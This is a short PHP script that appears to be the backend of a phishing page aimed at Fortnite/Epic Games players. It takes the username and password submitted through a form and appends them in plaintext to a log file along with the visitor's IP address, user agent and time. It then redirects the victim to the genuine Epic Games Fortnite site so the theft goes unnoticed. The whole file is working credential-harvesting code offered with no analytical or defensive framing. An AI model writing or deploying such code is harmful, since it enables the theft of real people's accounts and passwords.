<?php
$logfile = 'logs.txt';
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

$data = "Date: $date | IP: $ip | User Agent: $user_agent | Username: $username | Password: $password\n";

file_put_contents($logfile, $data, FILE_APPEND | LOCK_EX);

header('Location: https://www.epicgames.com/fortnite/en-US/home');
exit();
?>
